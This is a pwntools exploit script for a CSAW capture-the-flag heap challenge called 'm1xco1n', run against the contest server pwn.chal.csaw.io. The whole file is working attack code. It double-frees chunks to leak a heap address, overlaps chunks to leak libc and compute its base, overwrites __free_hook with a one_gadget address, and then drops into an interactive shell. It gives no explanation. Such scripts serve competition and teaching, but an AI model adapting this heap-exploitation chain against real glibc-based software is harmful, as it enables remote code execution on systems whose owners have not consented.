from pwn import *

e = ELF("./m1xco1n")
libc = ELF("./libc.so.6")

p = remote("pwn.chal.csaw.io", 1007)
#p = process(e.path)
#, env={"LD_PRELOAD": libc.path})

def alloc(a="AAAA", b="BBBB", note="note"):
  p.sendline("2")
  p.recvuntil("?")
  p.sendline(a)
  p.recvuntil("?")
  p.sendline(b)
  p.recvuntil("?")
  p.sendline("1")
  p.recvuntil("?")
  p.sendline(note)
  p.recvuntil(">")

def free():
  p.sendline("4")
  p.recvuntil(">")

def edit(to="AAAA", note="BBBB"):
  p.sendline("5")
  p.recvuntil("?")
  p.sendline(to)
  p.recvuntil("?")
  p.sendline("1")
  p.recvuntil(":")
  p.sendline(note)
  p.recvuntil(">")

p.recvuntil(">")

alloc(note="A" * 0x24 + p64(0x71))
alloc()
free()
free()

p.sendline("3")
p.recvuntil("BBBB with 1")
p.recvline()

leak = u64(p.recvuntil(" ", drop=True).ljust(8, "\x00"))
print("{:#x}".format(leak))

alloc()
edit(p64(leak +  0x0000561eb5078670 -  0x0000561eb50786e0 + 0x10 - 0x30)[:6], "A" * 0xc + p64(leak - 0x561eb50786e0 + 0x561eb50784f8)[:6])

p.sendline("3")
p.recvuntil(" ")
libc_base = u64(p.recvuntil(" ", drop=True).ljust(8, "\x00")) - 0x7fa482d510e8 + 0x00007fa4827cd000
print("{:#x}".format(libc_base))
p.recvuntil(">")

free()
free()
alloc()
edit(p64(libc_base + libc.symbols["__free_hook"] - 36)[:6], p64(libc_base + [0x4f2c5, 0x4f322, 0x10a38c][1])[:6])
p.sendline("4")

p.interactive()
